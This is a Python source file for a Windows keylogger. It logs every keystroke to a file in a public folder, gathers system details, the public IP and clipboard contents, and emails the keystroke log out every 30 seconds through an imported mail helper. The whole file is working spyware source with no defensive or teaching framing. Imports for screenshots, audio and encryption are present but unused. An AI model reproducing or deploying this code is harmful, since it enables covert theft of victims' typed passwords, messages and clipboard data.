# Libraries
from pynput.keyboard import Key, Listener 
from requests import get
from cryptography.fernet import Fernet
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from scipy.io.wavfile import write

from KL_Mail import send_email

import smtplib
import socket
import platform
import win32clipboard # type: ignore
import sounddevice as sd
import getpass
import keyboard
import os
import threading
import time

keys_infor = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard_info.txt"

file_path = "C:\\Users\\Public\\Public Keylogger" #Default path
extend = "\\"

toaddr = "" # address to send the log file to

count = 0
keys =[]

def com_info():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip + "\n")   
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")

        f.write("`````````````System Information````````````\n")
        f.write("Processor: " + (platform.processor()) + "\n")  
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
        f.write("``````````````````````````````````````````1\n")

def clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + data + "\n")
        except:
            f.write("Clipboard could not be copied\n")

def on_press(key):
    global keys, count
    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path + extend + keys_infor, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False
    
def start():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def show_path_to_log():
    print("Path to log file: ", file_path + extend + keys_infor)

def set_log_file_path(path):
    global file_path
    file_path = path
    print("Log file path set to: ", file_path)

def schedule_email(interval):
    send_email(keys_infor, file_path + extend + keys_infor, toaddr)
    threading.Timer(interval, schedule_email, [interval]).start()

# Email function call with timer
schedule_email(30)

# Computer information function call
com_info()

# Clipboard function call
clipboard()

